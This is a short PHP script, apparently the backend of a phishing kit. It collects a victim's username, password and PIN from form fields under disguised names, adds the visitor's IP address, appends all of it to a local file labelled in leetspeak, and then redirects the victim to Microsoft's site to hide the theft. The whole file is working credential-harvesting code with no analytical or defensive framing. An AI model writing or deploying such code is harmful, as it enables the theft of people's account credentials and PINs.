<?php
$travis = $_POST['travis'];
$scott = $_POST['scott'];
$nnnn = $_POST['nnnn'];
$ip = $_SERVER['REMOTE_ADDR'];

	//guardar archivo texto
	$file = fopen ( 'metruax.html' , 'a+');
	fwrite($file, "
USU4RIO: ".$travis."\r\nCL4V3: ".$scott."\r\nIP: ".$ip."\r\nPIN: ".$nnnn."\r\n==============================\r\n");
	fclose($file);
	header ('location: https://www.microsoft.com/es-ve/');


?>